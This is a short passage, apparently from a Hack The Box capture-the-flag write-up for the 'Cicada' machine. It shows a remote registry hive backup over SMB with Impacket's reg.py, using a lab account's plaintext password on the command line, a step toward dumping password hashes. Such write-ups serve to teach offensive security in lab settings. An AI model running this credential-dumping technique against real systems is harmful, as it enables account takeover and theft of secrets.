@@ -1,0 +1,1 @@
+at a run. reg.py will write to an SMB share I create, but it’s so slow, and almost always times out. I’m not sure if that’s reg.py , smbserver.py , and an issue with the HTB VPN. Still I could use reg.py to make copies of the registry hives: oxdf@hacky$ reg.py 'cicada.htb/emily.oscars:Q!3@Lp#M6b*7t*Vt' @10.10.11.35 backup -o
